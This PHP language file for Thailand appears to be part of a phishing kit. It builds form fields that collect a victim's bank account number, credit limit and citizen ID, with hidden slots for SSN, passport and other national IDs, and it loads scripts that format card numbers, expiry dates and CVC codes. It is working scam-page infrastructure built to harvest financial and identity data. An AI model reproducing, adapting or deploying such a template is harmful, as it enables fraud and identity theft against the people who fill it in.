<?php
/* 
------------------
Language:  English US
------------------
*/

$langx = array();
$langx['POSTCODE'] = 'Post/ZIP Code';
$langx['COUNTRY'] = 'Thailand';
$langx['COUNTYSELECT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="State/Province">
</div>
</div>
';
$langx['ACCOUNT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="acno" id="acno" class="generic-input-field form-control field" placeholder="account number" required="required">
</div>
</div>
<input type="hidden" name="sortcode" value="-">
<input type="hidden" name="bans" value="-">
';
$langx['CREDITLIMIT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="climit" id="climit" class="generic-input-field form-control field" placeholder="credit limit (Ex: $5000)" required="required">
</div>
</div>
';
$langx['PASSPORT'] = '
<input type="hidden" name="passport" value="-">
';
$langx['SSN'] = '
<input type="hidden" name="ssn" value="-">
';
$langx['NUMBID'] = '
<input type="hidden" name="numbid" value="-">
';
$langx['NAID'] = '
<input type="hidden" name="naid" value="-">
';
$langx['CIVILID'] = '
<input type="hidden" name="civilid" value="-">
';
$langx['QATARID'] = '
<input type="hidden" name="qatarid" value="-">
';
$langx['CITIZENID'] = '
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">Citizen ID</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
  <input type="text" name="citizenid" id="citizenid" class="generic-input-field form-control field" placeholder="citizen id" required="required">
</div>
</div>
</div>
</div>
</div>
';
$langx['APPCALL'] = '0800 048 0408';
$langx['FLAG'] = 'assets/img/th.png';
?>
<script type='text/javascript' src="assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="assets/js/Valid.AU.php"></script>
  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(galat) {
        this.parent('.form-group').toggleClass('has-error', galat);
        return this;
      };

    });
  </script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
});
</script>

